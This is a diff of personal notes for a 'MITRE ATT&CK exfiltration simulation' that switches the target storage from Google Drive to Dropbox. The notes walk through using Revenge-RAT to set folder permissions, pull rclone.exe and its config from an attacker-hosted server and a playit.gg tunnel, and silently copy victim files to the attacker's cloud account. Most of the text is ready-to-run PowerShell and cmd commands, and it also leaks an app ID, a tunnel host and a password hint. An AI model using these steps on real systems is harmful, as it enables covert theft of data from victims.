@@ -1,6 +1,6 @@
-## MITRE ATT\&CK Exfiltration Simulation via Google Drive using **rclone**
+## MITRE ATT\&CK Exfiltration Simulation via dropbox using **rclone**
 
-We can exfiltrate data using RAT's built-in download functionality already, it will then save into **E:\Hacking\Tools\Revenge-RAT v0.3\Users\User_name\downloads**. But to simulate it through powershall I deep dive into this. I tried many ways, I tried to build a http server using flask, and then through port forwarding, I tried to send files there. But as the RAT doesn't have write access thats why I didn't manage to do it then. Then I tried to do it directly via Google Drive, but I faced typos there. Then I tried rclone, to do so, it is better to use your own drive. And for this,s I followed **https://console.cloud.google.com/auth/clients?inv=1&invt=AbxtVQ&project=theta-totem-446705-j3** this link, to get the client id and client secret, then I use it later while setting rclone. Here are the following steps to do exfiltration:
+I followed **https://www.dropbox.com/developers/apps/info/s3jnq4f8fcstvgw** this link, to get the client id and client secret, then I use it later while setting rclone. Here are the following steps to do exfiltration:
 
 ### 0. Give Write Access To a Folder
 To give a folder **write access**, especially from a script or RAT shell (with limited UI or feedback), you can use PowerShell or `icacls` commands to set permissions. Here's how:
@@ -44,7 +44,7 @@ cmd.exe /c echo Hello > C:\PublicRAT\test.txt
 
 ---
 
-### 2. **Configure `rclone` with Google Drive**
+### 2. **Configure `rclone` with dropbox**
 
 In your **attacker machine's terminal**, run:
 
@@ -55,10 +55,11 @@ rclone config
 Follow these steps:
 
 1. Type `n` for a new remote.
-2. Name it something like: `myStorage`
-3. Choose storage type: `drive` (20 for Google Drive)
-4. Follow the prompts to authenticate via browser (use your Google account).
+2. Name it something like: `dropboxStorage`
+3. Choose storage type: `drive` (13 for dropbox)
+4. Follow the prompts to authenticate via browser.
 5. At the end, type `y` to confirm, then `q` to quit.
+6. Then in this linke, `https://www.dropbox.com/developers/apps/info/s3jnq4f8fcstvgw#permissions`, give all `write & read` access in `Files and folders` and `Collaboration`.
 
 This process generates the config file. Then try this command to find the actual location:
 
@@ -106,7 +107,7 @@ Go through **File Manager** to the expected folder and upload the **reclone.conf
 
 ```powershell
 Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
-# Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
+Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
 ```
 
 ```powershell
@@ -122,19 +123,19 @@ Now `rclone.exe` and its config are on the **victim system**.
 Send via RAT: 
 
 ```powershell
-Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
+Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" dropboxStorage:/ --config "C:\PublicRAT\rclone.conf"'
 ```
 
 Notes:
 
-* `myStorage` is the name you used during `rclone config`.
+* `dropboxStorage` is the name you used during `rclone config`.
 * You can exfiltrate any file the user has permission to read.
 
 ---
 
-### 6. **Check Google Drive**
+### 6. **Check dropbox**
 
-Your file (e.g., `secret.txt`) should now appear in the root of your Google Drive. You need to wait for some minutes (1-2) to get the file there.
+Your file (e.g., `secret.txt`) should now appear in the root of your dropbox `https://www.dropbox.com/home?_ad=20016251&_camp=LCEPA&_tk=notification&checklist=open`. You need to wait for some minutes (1-2) to get the file there.
 
 ---
 
@@ -146,14 +147,14 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
 | ------------------- | ----------------------------------------- | ----------------------------------- |
 | Execution           | T1059 - Command and Scripting Interpreter | PowerShell shell via RAT            |
 | Ingress Tool        | T1105 - Ingress Tool Transfer             | Download `rclone.exe` and `.conf`   |
-| Exfiltration        | T1567.002 - Exfil to Cloud Storage        | Send files to Google Drive          |
+| Exfiltration        | T1567.002 - Exfil to Cloud Storage        | Send files to dropbox          |
 | Persistence/Stealth | T1027 - Obfuscated Files or Info          | Using trusted tools like PowerShell |
 
 
 ### Full process using port forwarding
 
 * Start the playit.gg both from homescreen and the playit-0.9.3-signed from **E:\Hacking\Tools\PlayIt.gg**
-* E.g., start the server from **E:\Hacking\rclone-v1.69.2-windows-amd64\rclone-payload** :
+* E.g., start the server from **E:\Hacking\rclone-v1.69.2-windows-amd64\rclone-payload** or **E:\Hacking\rclone-v1.69.2-windows-amd64\dropbox-payload** or directly **E:\Hacking\rclone-v1.69.2-windows-amd64**:
    ```bash
    python -m http.server 1335
    ```
@@ -168,13 +169,13 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
   ```cmd
   cmd.exe /c echo Hello > C:\PublicRAT\test.txt
   ```
-* If the **test.txt** successfully writes in that location, then do:
+* If the **test.txt** successfully writes in that location, then first direct upload the latest `rclone.conf` in `C:\PublicRAT\`. Then do the following in RAT shell:
+
   ```powershell
   Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
-  Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
   ```
 * Then transfer data using the following convention:
   ```powershell
-  Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
+  Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" dropboxStorage:/ --config "C:\PublicRAT\rclone.conf"'
   ```
-* Check your BSSE drive and click recent, you will get the desired file.
+* Check your dropbox (in bsse mail, pass is as like your cefalo PC's password) and click recent, you will get the uploaded file.
